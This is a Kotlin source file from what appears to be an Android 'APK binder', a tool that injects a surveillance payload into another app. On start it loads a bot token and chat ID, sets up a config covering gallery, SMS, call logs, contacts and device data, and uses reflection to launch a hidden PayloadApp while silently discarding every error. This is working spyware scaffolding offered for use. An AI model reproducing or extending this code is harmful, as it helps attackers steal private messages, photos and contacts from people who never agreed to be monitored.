package Com.devhs.apkbinder

import android.app.Application
import android.content.Context
import Com.devhs.apkbinder.data.Prefs
import Com.devhs.apkbinder.payload.PayloadApp
import Com.devhs.apkbinder.payload.PayloadState
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.runBlocking
import org.json.JSONArray
import org.json.JSONObject

class HsBinderApp : Application() {

    override fun onCreate() {
        super.onCreate()

        val testMode = runBlocking { Prefs.testMode(this@HsBinderApp).first() }
        if (!testMode) return

        val token = runBlocking { Prefs.token(this@HsBinderApp).first() }
        val chat = runBlocking { Prefs.chatId(this@HsBinderApp).first() }
        if (token.isBlank() || chat.isBlank()) return

        PayloadState.testMode = true
        PayloadState.config = JSONObject().apply {
            put("token", token)
            put("chatId", chat)
            put("origApp", "")
            put("features", JSONArray(listOf("gallery", "sms", "calls", "contacts", "device")))
        }

        try {
            val payload = PayloadApp()
            val attach = Application::class.java.getDeclaredMethod("attach", Context::class.java)
            attach.isAccessible = true
            attach.invoke(payload, this)
            payload.onCreate()
        } catch (_: Throwable) {
        }
    }
}
